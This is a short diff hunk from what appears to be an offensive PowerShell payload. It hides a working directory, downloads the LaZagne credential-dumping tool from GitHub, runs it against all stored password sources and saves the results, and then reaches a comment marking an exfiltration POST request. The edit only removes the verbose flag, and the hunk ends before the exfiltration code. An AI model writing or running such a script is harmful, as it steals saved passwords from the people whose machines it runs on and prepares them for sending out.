@@ -92,7 +92,7 @@ $hide.attributes='Hidden'
 # Download the executable
 Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"
 # Execute the executable and save output to a file
-& "$dir\lazagne.exe" all -v > "$dir\output.txt"
+& "$dir\lazagne.exe" all > "$dir\output.txt"
 
 # Exfiltrate the file
 #POST REQUEST
